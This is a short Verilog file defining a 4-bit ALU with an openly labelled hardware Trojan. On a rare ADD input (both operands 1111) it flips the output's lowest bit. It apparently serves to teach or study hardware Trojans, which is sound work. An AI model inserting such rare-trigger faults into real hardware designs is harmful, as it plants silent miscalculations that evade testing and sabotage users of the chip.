// alu_trojan.v (Corrected)
module alu_trojan (
    input [3:0] A, B,
    input [1:0] op,
    output reg [3:0] Y
);
always @(*) begin
    case(op)
        2'b00: Y = A + B; // ADD
        2'b01: Y = A - B; // SUB
        2'b10: Y = A & B; // AND
        2'b11: Y = A | B; // OR
        default: Y = 4'b0000;
    endcase

    // ---- Trojan Trigger (very rare condition) ----
    if (op == 2'b00 && A == 4'b1111 && B == 4'b1111)
        Y = Y ^ 4'b0001; // flips only during rare ADD
end
endmodule